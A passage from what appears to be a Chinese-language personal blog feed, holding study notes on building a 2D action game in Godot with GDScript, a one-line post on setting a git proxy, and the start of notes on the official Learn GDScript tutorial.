每秒.</p><p>原本，一帧处理完之后，物体才会从一个位置移动到另一个位置.</p><p>使用 Vector2 对象的成员函数 <code>normalized()</code>, 返回一个 unit vector.</p><p>模拟摩擦力需要用到 <code>move_toward()</code> 成员函数，理解为向这个给定的向量靠近, 后面加速率.</p><p>设定最大速度用 <code>limit_length()</code> 成员函数:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">velocity</span> <span class="hljs-operator">=</span> velocity.limit_length(MAX_SPEED * delta)<br></code></pre></td></tr></table></figure><h1 id="P3-碰撞、move-and-slide"><a href="#P3-碰撞、move-and-slide" class="headerlink" title="P3. 碰撞、move_and_slide()"></a>P3. 碰撞、move_and_slide()</h1><p>给 KinematicBody2D 添加碰撞. 点击 KinematicBody2D 节点然后添加 CollisionShape2D 节点.</p><p>在右侧边栏选择形状 CollisionShape2D -&gt; Shape</p><p>选中子节点后按住 Alt 可以只移动子节点.</p><p>可以给 StaticBody2D 添加 CollisionPolygon2D, 然后可以自己画出形状. (利用上边栏多出的选项)</p><p>画出后 CollisionShape 还不可见，需要在左上角边栏里的 Debug -&gt; Visible Collision Shapes 打开.</p><p>使用 <code>move_and_collide()</code> 函数不能让你沿着碰撞体滑动. 可以使用 <code>move_and_slide()</code> 解决，但是需要去除 delta.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">velocity</span> <span class="hljs-operator">=</span> move_and_slide(velocity)<br></code></pre></td></tr></table></figure><p>设置 Window -&gt; Stretch -&gt; Aspect -&gt; keep.</p><h1 id="P4-场景、YSort节点"><a href="#P4-场景、YSort节点" class="headerlink" title="P4. 场景、YSort节点"></a>P4. 场景、YSort节点</h1><h2 id="讲解部分"><a href="#讲解部分" class="headerlink" title="讲解部分"></a>讲解部分</h2><p>Godot 可以从已有场景中的节点来创建新的节点. (将一个节点设置为一个单独的 scene, 然后拖拽到新的场景中)</p><p>点击一个节点 -&gt; Save Branch as Scene. 先把右侧边栏中的 Transform 下的坐标设置为 (0, 0), 不然你放置的位置是相对原点, 而不是准确的你想要的位置.</p><p>将一个物体设置为单独的场景方便管理.</p><p>利用 YSort节点 来显示层次关系. 其判断谁在表面谁在下面是通过中心点的 Y 值.</p><p><img src="/../img/Ysort_center_of_obj1.png"><br><img src="/../img/Ysort_center_of_obj2.png"></p><p>可以看到 Y 值大的在表面.</p><p>点击一个节点，然后 Change Type -&gt; Ysort.</p><h2 id="步骤总结"><a href="#步骤总结" class="headerlink" title="步骤总结"></a>步骤总结</h2><p>在一个节点下添加场景:</p><ol><li>创建一个节点，选中这个节点 </li><li>将场景拖拽到地图中，可以看到这个场景挂载到了这个节点下. (一个场景就是节点的集合)</li></ol><h1 id="P5-角色动画-AnimationPlayer"><a href="#P5-角色动画-AnimationPlayer" class="headerlink" title="P5. 角色动画-AnimationPlayer"></a>P5. 角色动画-AnimationPlayer</h1><h2 id="讲解部分-1"><a href="#讲解部分-1" class="headerlink" title="讲解部分"></a>讲解部分</h2><p>给角色的节点添加 AnimationPlayer 节点.</p><p>点击 AnimationPlayer 节点，在下边栏中点击 Animation -&gt; New</p><p>Snap 是每一帧的间隔时间, 右上角侧是总时间. 右下角可以调整 timeline.</p><p>可以在编辑器中预览动画.</p><p>在 Player 脚本内访问 AnimationPlayer 节点.</p><p>写在 <code>_ready()</code> 中, 如:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">var animationPlayer = <span class="hljs-literal">null</span><br><br><span class="hljs-keyword">func</span> <span class="hljs-title function_">_ready</span><span class="hljs-params">()</span>:<br>    animationPlayer = $AnimationPlayer<br></code></pre></td></tr></table></figure><p><code>$</code> 是 <code>get_node()</code> 的缩写，可以用来获取树中的节点.</p><p>或者写成不需要 <code>_ready()</code> 函数的形式:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">onready <span class="hljs-keyword">var</span> animationPlayer = <span class="hljs-symbol">$A</span>nimationPlayer<br></code></pre></td></tr></table></figure><p>可以查看 AnimationPlayer 的文档如何使用 Animation.</p><p>使用 AnimationPlayer 类的成员函数 <code>play()</code>, 其中一个参数是动画名:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">animationPlayer.<span class="hljs-keyword">play</span>(<span class="hljs-string">&quot;IdleRight&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="步骤总结-1"><a href="#步骤总结-1" class="headerlink" title="步骤总结"></a>步骤总结</h2><h1 id="P6-利用-AnimationTree-设置角色四方向动画"><a href="#P6-利用-AnimationTree-设置角色四方向动画" class="headerlink" title="P6. 利用 AnimationTree 设置角色四方向动画"></a>P6. 利用 AnimationTree 设置角色四方向动画</h1><p>在 Play 下添加一个节点 AnimationTree, 需要现在右侧边栏中 AnimationTree -&gt; Anim Player 中给它分配一个 AnimationPlayer.</p><p>AnimationTree 有很多中结构，需要在右侧边栏中选择 AnimationTree -&gt; Tree Root, 这里选择的是 AnimationNodeStateMachine.</p><p>同样要勾选 Animation -&gt; Active -&gt; on, 来 activate 这个 tree.</p><p>在下边栏中右键可创建动画.</p><p>添加 Blendspace2D, 这个节点的含义大概是将多个动画放在一起，通过一个二维向量来判断播放哪一个. 注意这里的坐标系和二维游戏坐标系不同. 切换到虚线模式.</p><p>可以添加几个 Blendspace2D 动画的转换. 即什么条件下从一个动画切换到下一个动画.</p><p>如:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">animationTree.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;parameters/Idel/blend_position&quot;</span>, input_vector)<br></code></pre></td></tr></table></figure><p>这个的含义大概是设置 “parameters&#x2F;Idel&#x2F;blend_position” 这个动画，然后通过 <code>Input_vector</code> 这个向量来设置 前者的值.</p><p><code>set</code> 第一个参数是 AnimationTree 右边栏的参数.</p><h1 id="P7-草地背景和Auto-Tile"><a href="#P7-草地背景和Auto-Tile" class="headerlink" title="P7. 草地背景和Auto Tile"></a>P7. 草地背景和Auto Tile</h1><p>重新设置一下.</p><p><img src="/../img/reset_to_node2D.png"></p><p>第一个方法设置背景:</p><p>设置一个 regon, 点击图片 Import -&gt; Flags -&gt; Repeat -&gt; Enabled -&gt; reimport, 之后先在右边栏 Regon -&gt; Enabled -&gt; on, 然后在下边栏 -&gt; Textureregion</p><p>第二个方法，添加一个 TextureRect 节点. 添加图片后，在右边栏设置 Stretch Mode -&gt; Tile, 就会自动平铺.</p><p>关于 Tile 的部分，添加一个 TileMap 节点, 先设置一部分，在右边栏 Cell -&gt; Size 两个 16, 然后 TileMap -&gt; Tile Set -&gt; TileSet, 点击这个 TileSet 可以看到 Resource 的参数.</p><p>在 Tile 面板中一般添加 Autotile</p><p>Bitmask 的作用不太清楚.</p><p>Shift + F12 可以将 TileMap 全屏。</p><h1 id="P8-Autotile碰撞"><a href="#P8-Autotile碰撞" class="headerlink" title="P8. Autotile碰撞"></a>P8. Autotile碰撞</h1><p>给一些 tile 增加碰撞的特性.</p><h1 id="P9-攻击动画和State-Machine"><a href="#P9-攻击动画和State-Machine" class="headerlink" title="P9. 攻击动画和State Machine"></a>P9. 攻击动画和State Machine</h1><h2 id="讲解部分-2"><a href="#讲解部分-2" class="headerlink" title="讲解部分"></a>讲解部分</h2><p>enum 是从 0 开始的.</p><p>设置键位: Project -&gt; Project Settings -&gt; Input_map, 然后就可以设置, 添加.</p><p>同样添加动画.</p><p>在动画的最后一帧添加一个 track: Add Track -&gt; Call Method Track, 这一帧用来调用一个函数.</p><h2 id="总结步骤"><a href="#总结步骤" class="headerlink" title="总结步骤"></a>总结步骤</h2><p>添加并引用动画的步骤:</p><ol><li>创建一个节点, 添加 Sprite 节点 (或 AnimatedSprite 节点) 并添加含有多帧画面的图像</li><li>若是 Sprite 节点，则再添加一个 Animation 节点如 AnimationPlayer, AnimationTree </li><li>设置动画</li><li>在挂载的脚本中引用动画，先用 <code>onready var animatedSprite = $AnimatedSprite</code> 这种形式来获取动画节点 (一个对象),</li></ol><h1 id="P10-信号、在代码中引用场景"><a href="#P10-信号、在代码中引用场景" class="headerlink" title="P10. 信号、在代码中引用场景"></a>P10. 信号、在代码中引用场景</h1><h2 id="讲解部分-3"><a href="#讲解部分-3" class="headerlink" title="讲解部分"></a>讲解部分</h2><p>ysort 是用父节点来排序的.</p><p><code>_process(delta)</code> 和 <code>_physic_process(delta)</code> 的区别，前者的 <code>delta</code> 不是常量，后者的 <code>delta</code> 是常量.</p><p><code>queue_free()</code> 函数，将节点添加到一个会被 free 的队列中. 注意和 <code>free()</code> 的区别，前者不是立即清除.</p><p>简单的动画使用 <code>AnimatedSprite</code> 节点.</p><p>在 <code>AnimatedSprite</code> 节点中的右边栏，切换到 Node 可以看到 Signals</p><p>信号可以在某个事件发生时触发, 当一个信号触发时 (连接到一个函数就是当这个函数运行时.)</p><p><code>load()</code> 函数，加载一个场景.</p><p><code>instance()</code> 函数，用场景创建一个节点.</p><p>用 <code>get_tree().current_scene</code> 来获取当前场景的根节点.</p><p>节点用 <code>add_child()</code> 成员函数可以添加子节点. 这个子节点的位置默认是 (0, 0), 因此需要添加位置. 如:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">grassEffect.global_position</span> = global_position<br></code></pre></td></tr></table></figure><p><code>global_position</code> 应该是预处理的变量. 你把代码挂载到哪一个节点，这个位置就是哪一个节点的位置.</p><p>Remote 是当前游戏运行的即时场景.</p><h2 id="总结步骤-1"><a href="#总结步骤-1" class="headerlink" title="总结步骤"></a>总结步骤</h2><p>动画播放后消失:</p><ol><li>给节点挂载脚本</li><li>添加信号 animation_finished</li><li>在这个信号提供的函数下写动画播放完毕后要做的事</li></ol><p>在一个节点中引用场景的步骤:</p><ol><li>选择一个节点的脚本 (你想把场景加载到这个节点下)，加载场景，储存在变量里</li><li>引用该场景，储存在变量里</li><li>把引用添加到任意一个节点下面，作为它的子节点</li><li>设置子节点的位置</li></ol><h1 id="P11-近战攻击的Hurtboxes（伤害检测框）"><a href="#P11-近战攻击的Hurtboxes（伤害检测框）" class="headerlink" title="P11. 近战攻击的Hurtboxes（伤害检测框）"></a>P11. 近战攻击的Hurtboxes（伤害检测框）</h1><h2 id="讲解部分-4"><a href="#讲解部分-4" class="headerlink" title="讲解部分"></a>讲解部分</h2><p>新建两个场景，使用 Area2D 节点. 其有与位置相关的信号.</p><p>分为 Hurtbox 和 Hitbox.</p><p>给节点添加 CollisionShape2D 子节点.</p><p>一个 Area2D 节点必须要有 CollisionShape2D 节点. 可以用来检测碰撞，检测玩家进入区域等 (查看右边栏的 Signals).</p><p>把 Area2D 场景添加到一个节点上.</p><p>Hurtbox 加在受到攻击的物体上，Hitbox 加在发出攻击的物体上.</p><p>将 Hitbox 绑定到击打动画上, 创建一个 Position2D 节点 (其实际上和 Node2D 差不多, 只不过用的是十字坐标, Node2D 也可以添加 key).</p><p>需要确定在某一帧激活 Hitbox</p><p>Collision -&gt; Layer 和 Mask 可以在 Project Setting -&gt; Layer Names -&gt; 2d Physics 中命名</p><p>注意 Layer 和 Mask 的作用，Layer 是设置当前节点所在那一层, Mask 是设置当前节点会和那一层发生关系, 设置了的则会被处于 Layer 的扫描到 (为什么叫 Mask, 不清楚)</p><h2 id="步骤总结-2"><a href="#步骤总结-2" class="headerlink" title="步骤总结"></a>步骤总结</h2><p>思路: 检测碰撞 -&gt; 在指定事件发生时触发</p><h1 id="P13-蝙蝠小怪和击退效果"><a href="#P13-蝙蝠小怪和击退效果" class="headerlink" title="P13. 蝙蝠小怪和击退效果"></a>P13. 蝙蝠小怪和击退效果</h1><h2 id="讲解部分-5"><a href="#讲解部分-5" class="headerlink" title="讲解部分"></a>讲解部分</h2><p>击退效果的思路，在遭遇伤害时给一个与攻击方向相同的初速度，然后通过 <code>move_toward()</code> 函数让这个初速度变为零.</p><p>用 <code>onready var swordHitbox = $SwordHisbox</code> 获取的节点，可以访问其中挂载脚本的变量如:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">swordHitbox.knockback_vector</span> = Vector2.ZERO<br></code></pre></td></tr></table></figure><p>关于这两行的理解:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">func _on_Area2D_area_entered(<span class="hljs-built_in">area</span>):<br>knockback = <span class="hljs-built_in">area</span>.knockback_vector * <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>这里的参数 <code>area</code> 是进入这个 area 的 Area2D 对象. <code>knockback_vector</code> 是这个对象挂载脚本里的变量.</p><p>一个节点，挂载了脚本之后，似乎脚本中的变量可以被当作成员变量使用.</p><h1 id="P14-敌人属性、输出变量、Setget、代码结构"><a href="#P14-敌人属性、输出变量、Setget、代码结构" class="headerlink" title="P14. 敌人属性、输出变量、Setget、代码结构"></a>P14. 敌人属性、输出变量、Setget、代码结构</h1><p>创建通用的属性. 就是把一部分节点保存为场景，在其他场景中引用.</p><p><code>export</code> 一个变量，就是将其变为可以在编辑器中直接修改</p><p>用 <code>export</code> 带固定属性的写法:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">export</span><span class="hljs-params">(int)</span></span> <span class="hljs-selector-tag">var</span> test = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>注意, 在编辑器中获取的数值，是在 ready 的时候更新.</p><p>创建信号, 如:</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">signal</span><span class="hljs-string"> no_health</span><br></code></pre></td></tr></table></figure><p>发送信号示例:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">_process</span>():</span><br><span class="hljs-function">    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">health</span> &lt;= <span class="hljs-number">0</span>:</span><br><span class="hljs-function">        <span class="hljs-title">emit_signal</span>(<span class="hljs-string">&quot;no_health&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>在一个值改变是调用一个函数, 使用 <code>setget</code>:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gml">onready <span class="hljs-keyword">var</span> <span class="hljs-variable language_">health</span> = max_health setget set_health<br><br>func set_health(value):<br>    <span class="hljs-variable language_">health</span> = value<br></code></pre></td></tr></table></figure><p>这里，每当 <code>health</code> 的值发生改变，就会调用 <code>set_health()</code> 函数. </p><p>注意 “向下调用，向上信号”, 意思是，节点树的上层要传递信息给下层，则使用函数传递，下层向上层传递信息，则使用信号.</p><p>一个脚本可以继承另一个脚本，如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">expands</span> <span class="hljs-string">&quot;res://Overlap/Hitbox.gd&quot;</span><br></code></pre></td></tr></table></figure><h1 id="P15-小怪死亡效果、Bug修复"><a href="#P15-小怪死亡效果、Bug修复" class="headerlink" title="P15. 小怪死亡效果、Bug修复"></a>P15. 小怪死亡效果、Bug修复</h1><p>设置所有初始动画的 Blend Position 相同.</p><p><code>preload()</code> 函数的使用.</p><h1 id="P16-蝙蝠基础AI"><a href="#P16-蝙蝠基础AI" class="headerlink" title="P16. 蝙蝠基础AI"></a>P16. 蝙蝠基础AI</h1><p>添加检测玩家的区域. 添加 Area2D 节点.</p><p>添加 body_entered 和 body_exited 信号.</p><p>其信号函数中:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">_on_PlayerDetectZone_body_entered</span><span class="hljs-params">(body)</span>:<br></code></pre></td></tr></table></figure><p>的 <code>body</code> 应该代表一个场景对象.</p><p>使图片水平反转，需要使用 <code>flip_h</code> 成员函数.</p><h1 id="P17-玩家属性、小怪攻击"><a href="#P17-玩家属性、小怪攻击" class="headerlink" title="P17. 玩家属性、小怪攻击"></a>P17. 玩家属性、小怪攻击</h1><p>思路，通过区域检测来判断攻击.</p><p><code>connect()</code> 函数的用法: 信号，对象，对象中的函数</p><p>Timer 节点. 有 <code>start()</code> 成员函数，参数是一段时间. 其结束时会和 time_out 信号发生作用.</p><p>调整 Monitorable 属性 (或 Monitoring)，达到重新发送信号的要求.</p><p>有些属性不能在 <code>_physic_process()</code> 运行中直接修改, 需要用 <code>set_deferred()</code> 函数，第一个参数是属性，第二个是值.</p><p>自动加载一个场景: Project -&gt; Project Settings -&gt; Autoload -&gt; 选择一个文件 -&gt; add</p><h1 id="P18-玩家生命值UI"><a href="#P18-玩家生命值UI" class="headerlink" title="P18. 玩家生命值UI"></a>P18. 玩家生命值UI</h1><p>给 world 场景添加一个新的节点.</p><p>Godot 里大部分 Control 节点都和 UI 有关系. 其 position 和 普通的不同. 其很多属性也和 node2D 不同.</p><p>有锚点属性 Anchor, 其默认位于原点. margin 表示 label 的大小.</p><p>创建一个 Control 节点，再创建一个 label 子节点. 将其作为场景保存.</p><p>关于 <code>clamp()</code> 函数，其将一个数截取. 三个参数，输入，最小，最大.</p><p>使用 <code>setget</code> 的好处是，当一个变量改变时，会触发一个函数.</p><p>使用 TectureRect 节点, 设置在拉伸时自动重复: 右侧边栏 -&gt; TectureRect -&gt; Stretch Mode -&gt; Tile</p><p>通过长度来判断心的个数.</p><p>设置生命值不超过最大值可以用 <code>min()</code> 函数, 其返回两个参数中的最小值.</p><p>设置 TectureRect 节点右边栏 Expand -&gt; on, 就可以把 Rect -&gt; Size 设置为 0.</p><p>定义的信号后面可以加上参数，可以在 <code>emit_signal()</code> 中发送:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">signal <span class="hljs-built_in">test</span>(value)<br><span class="hljs-function"><span class="hljs-title">emit_signal</span><span class="hljs-params">(<span class="hljs-string">&quot;test&quot;</span>, value1)</span></span><br></code></pre></td></tr></table></figure><p>添加一个静止不动的物体一般使用 StaticBody2D.</p><h1 id="P19-小怪软碰撞、性能监测"><a href="#P19-小怪软碰撞、性能监测" class="headerlink" title="P19. 小怪软碰撞、性能监测"></a>P19. 小怪软碰撞、性能监测</h1><p>创建软碰撞，先创建一个 Area2D 节点，添加一个 CollisionShape2D 子节点.</p><p>Area2D 的成员函数 <code>get_overlapping_areas()</code>, 判断是否重叠. 实现软碰撞的思路是让重叠的部分在检测到重叠时移动.</p><p>适当增加判断性函数如: <code>is_colliding()</code></p><h1 id="P20-镜头"><a href="#P20-镜头" class="headerlink" title="P20. 镜头"></a>P20. 镜头</h1><p>添加一个跟随角色的镜头.</p><p>在 Player 节点下添加一个 Camera2D 节点. 为了使用这个节点，在右侧边栏 Camera2D -&gt; Current -&gt; on</p><p>为了让生命值跟随镜头，添加一个 Canvaslayer 节点，这个节点会跟随镜头, 然后将生命值设置为其子节点. 开启右边栏的 Smoothing -&gt; Enabled -&gt; on 会更好.</p><p>解决角色死亡后镜头跳转问题. 将 Camera2D 节点移到外面，在 Player 下添加 RemoteTransform2D 节点，这个节点的作用是，你给它一个路径，就可以让指定路径的节点跟随这个节点. 由于这个 RemoteTransform2D 节点是跟随 Player 的，让 Camera2D 节点跟随这个节点也就可以跟随 Player.</p><p>可以调整 Camera 的大小.</p><h1 id="P21-蝙蝠游荡状态"><a href="#P21-蝙蝠游荡状态" class="headerlink" title="P21. 蝙蝠游荡状态"></a>P21. 蝙蝠游荡状态</h1><p>添加一个 Node2D 节点作为控制节点，因为需要这个节点的位置来作为游荡的原始位置.</p><p>给这个节点添加一个 Timer 子节点.</p><p>可以设置 Timer 自动开始，且运行一次. 右边栏 One Shot -&gt; on, Autostart -&gt; on</p><p><code>rand_range()</code> 函数可以返回范围内的随机值, 如: <code>rand_range(-32, 32)</code></p><p>数组的 <code>shuffle()</code> 函数，随机取出一个值. <code>pop_front()</code> 函数，选取数组的第一个值.</p><p>向 Player 移动:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var direction = global_position.direction<span class="hljs-constructor">_to(<span class="hljs-params">player</span>.<span class="hljs-params">global_position</span>)</span><br></code></pre></td></tr></table></figure><p><code>direction_to()</code> 函数，直译就是朝向，也就是设置当前位置指向 player 位置的方向向量.</p><h1 id="P22-音效、闪烁特效（着色器）"><a href="#P22-音效、闪烁特效（着色器）" class="headerlink" title="P22. 音效、闪烁特效（着色器）"></a>P22. 音效、闪烁特效（着色器）</h1><p>在 Player 节点下添加 AudioStreamPlayer 子节点 (其和 AudioStreamPlayer2D 的区别是，后者在靠近时音量会改变).</p><p>在 AnimationPlayer 中的下边栏 Animation 中 Add Track 可以添加 AudioStreamPlayer, 用于分配音频.</p><p>没有在同一个节点树中的节点，可以通过 <code>preload()</code> 来加载. 但使用是需要先用 <code>instance()</code> 创建一个对象，然后通过 <code>get_tree().current_scene.add_child()</code> 来将这个场景添加到树中.</p><p>闪烁特效同样添加 AnimationPlayer 子节点.</p><p>使用 Godot 的 Shader, 点击 Sprite, 然后右边栏下方 Material -&gt; Material -&gt; New ShaderMaterial -&gt; Shader -&gt; NewShader, shader 同样用代码控制，保存以 <code>.shaderl</code> 为后缀的文件.</p><p>Godot 的 shader 语言，有分号. 和 C++ 类似.</p><p>可操作每个像素的颜色.</p><p>在 Shader 中，应该避免使用 <code>if</code> 语句.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>设置-git-的代理</title>
    <link href="/2022/11/12/%E8%AE%BE%E7%BD%AE-git-%E7%9A%84%E4%BB%A3%E7%90%86/"/>
    <url>/2022/11/12/%E8%AE%BE%E7%BD%AE-git-%E7%9A%84%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git config --global http.proxy socks5h://127.0.0.1:1080<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn-GDScript-官方教程</title>
    <link href="/2022/11/12/Learn-GDScript-%E5%AE%98%E6%96%B9%E6%95%99%E7%A8%8B/"/>
    <url>/2022/11/12/Learn-GDScript-%E5%AE%98%E6%96%B9%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-What-Code-is-like"><a href="#1-What-Code-is-like" class="headerlink" title="1. What Code is like"></a>1. What Code is like</h1><p>GDScript 的语法和 Python 类似，也是用缩进判断层次, 代码块用 <code>:</code> 开始.</p><h1 id="2-Your-First-Error"><a href="#2-Your-First-Error" class="headerlink" title="2. Your First Error"></a>2. Your First Error</h1><p>注释符是 <code>#</code>.</p><h1 id="3-We-Stand-on-the-Shoulders-of-Giants"><a href="#3-We-Stand-on-the-Shoulders-of-Giants" class="headerlink" title="3. We Stand on the Shoulders of Giants"></a>3. We Stand on the Shoulders of Giants</h1><p>调用 <code>show()</code> 函数让 something visible, 调用 <code>hide()</code> 隐藏这些 entity.</p><p>使用 <code>func</code> 关键词定义函数:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">run</span>():</span><br><span class="hljs-function">    <span class="hljs-title">hide</span>()</span><br></code></pre></td></tr></table></figure><p><code>rotate()</code> 函数让 sprite 旋转:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">run</span>():</span><br><span class="hljs-function">    <span class="hljs-title">rotate</span>(<span class="hljs-number">0.3</span>)</span><br></code></pre></td></tr></table></figure><p>这里的 <code>0.3</code> 是弧度值.</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">degrees</span> = <span class="hljs-built_in">radians</span> * <span class="hljs-number">180</span> / <span class="hljs-built_in">PI</span><br></code></pre></td></tr></table></figure><p>使用 <code>move_local_x()</code> 函数，可以让 character 左右移动.</p><p><code>move_local_y()</code> 函数可以让 sprite 上下移动.</p><p>注意 2D 游戏设计中的坐标系是左上角为原点.</p><h1 id="4-Drawing-a-Rectangle"><a href="#4-Drawing-a-Rectangle" class="headerlink" title="4. Drawing a Rectangle"></a>4. Drawing a Rectangle</h1><h2 id="Meet-the-turtle"><a href="#Meet-the-turtle" class="headerlink" title="Meet the turtle"></a>Meet the turtle</h2><p>三个函数:</p><ul><li><code>move_forward(pixels)</code>, 向前移动</li><li><code>turn_right(degrees)</code>, 向右转</li><li><code>turn_left(degrees)</code></li></ul><h1 id="5-Coding-Your-First-Function"><a href="#5-Coding-Your-First-Function" class="headerlink" title="5. Coding Your First Function"></a>5. Coding Your First Function</h1><p>在编程中不说 “names” 而是说 “identifiers”.</p><p>使用函数主要是为了复用.</p><p>命名习惯:</p><ul><li><code>move_forward()</code></li><li><code>moveForward()</code></li></ul><h2 id="Instantly-moving-the-turtle-to-a-different-position"><a href="#Instantly-moving-the-turtle-to-a-different-position" class="headerlink" title="Instantly moving the turtle to a different position"></a>Instantly moving the turtle to a different position</h2><p>使用 <code>jump(x,y)</code> 函数. 不会划线.</p><h1 id="6-Your-First-Function-Parameter"><a href="#6-Your-First-Function-Parameter" class="headerlink" title="6. Your First Function Parameter"></a>6. Your First Function Parameter</h1><p>GDScript 中定义函数时的参数只有参数名，可以不加类型, 如:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">rotate</span><span class="hljs-params">(radiations)</span>:<br>    ...<br></code></pre></td></tr></table></figure><p>加类型如:</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">rotate</span>(<span class="hljs-params">radiations</span>: float):<br>    <span class="hljs-operator">...</span><br></code></pre></td></tr></table></figure><h1 id="7-Introduction-to-Member-Variables"><a href="#7-Introduction-to-Member-Variables" class="headerlink" title="7. Introduction to Member Variables"></a>7. Introduction to Member Variables</h1><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">run</span>():</span><br><span class="hljs-function">    <span class="hljs-title">rotate</span>(<span class="hljs-number">0.3</span>)</span><br></code></pre></td></tr></table></figure><p>实际上是升高这个 entity 的 rotation 成员变量.</p><h2 id="Accessing-sub-variables-with-the-dot"><a href="#Accessing-sub-variables-with-the-dot" class="headerlink" title="Accessing sub-variables with the dot"></a>Accessing sub-variables with the dot</h2><p>很多 Member variables 有 sub-values, 用 <code>.</code> 来使用.</p><p>如，调整 entity 的位置:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">func <span class="hljs-title">run</span><span class="hljs-params">()</span>:</span><br><span class="hljs-function">    position.x =</span> <span class="hljs-number">180</span><br>    position.y = <span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p><img src="/../img/coordinate_in_game.png"></p><p>调整 entity 的大小:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span> run():<br>    <span class="hljs-attribute">scale</span>.x = <span class="hljs-number">1</span>.<span class="hljs-number">5</span><br>    <span class="hljs-attribute">scale</span>.y = <span class="hljs-number">1</span>.<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h1 id="8-Defining-Your-Own-Variables"><a href="#8-Defining-Your-Own-Variables" class="headerlink" title="8. Defining Your Own Variables"></a>8. Defining Your Own Variables</h1><p>使用 <code>var</code> 关键字:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-keyword">var</span> <span class="hljs-variable language_">health</span><br></code></pre></td></tr></table></figure><p>重复定义会报错.</p><h1 id="9-Adding-and-Subtracting"><a href="#9-Adding-and-Subtracting" class="headerlink" title="9. Adding and Subtracting"></a>9. Adding and Subtracting</h1><h1 id="10-The-Game-Loop"><a 